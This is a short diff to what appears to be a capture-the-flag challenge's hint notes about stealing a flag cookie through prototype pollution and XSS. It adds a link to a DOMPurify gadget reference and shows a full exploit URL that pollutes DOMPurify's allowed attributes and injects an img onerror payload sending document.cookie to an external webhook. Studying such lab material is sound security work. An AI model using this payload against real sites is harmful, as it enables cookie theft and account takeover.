@@ -31,7 +31,7 @@ Browse {{link_as('/', 'here')}}, and find the flag!
 - Inspect the behavior and given source code of the function `pass_val`, combined with the lodash template usage to build up a XSS payload
 - carry out the attack to get the flag saved in document.cookie of another user, use a self-host server to get the 
   redirected request
-
+- https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/dompurify.md
 - cookie exploit url for remote server: http://localhost:8000?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src&__proto__[hasOwnProperty]={}&name=<img src onerror=fetch('https://webhook.site/62766d8c-83e6-40b6-a12d-6f65c884f7ce?cookie='%2Bdocument.cookie)>
 
 
